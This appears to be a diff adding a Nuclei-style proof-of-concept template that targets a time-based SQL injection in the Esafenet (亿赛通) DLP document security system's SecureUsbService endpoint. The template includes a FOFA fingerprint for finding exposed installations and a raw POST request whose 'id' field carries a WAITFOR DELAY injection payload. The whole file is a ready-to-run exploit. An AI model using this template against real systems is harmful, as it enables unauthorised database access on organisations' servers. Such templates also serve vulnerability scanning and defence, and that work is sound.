@@ -1,0 +1,28 @@
+id: poc-xcb8zw4vhhngh3q3
+info:
+  name: 亿赛通电子文档安全管理系统SecureUsbService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xcb8zw4vhhngh3q3'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xcb8zw4vhhngh3q3
+    fofa: app="亿赛通-DLP"
+http:
+- raw:
+  - 'POST /CDGServer3/device/SecureUsbService;login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    command=DelSecureUsb&id=a'';WAITFOR+DELAY+''0:0:5''--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
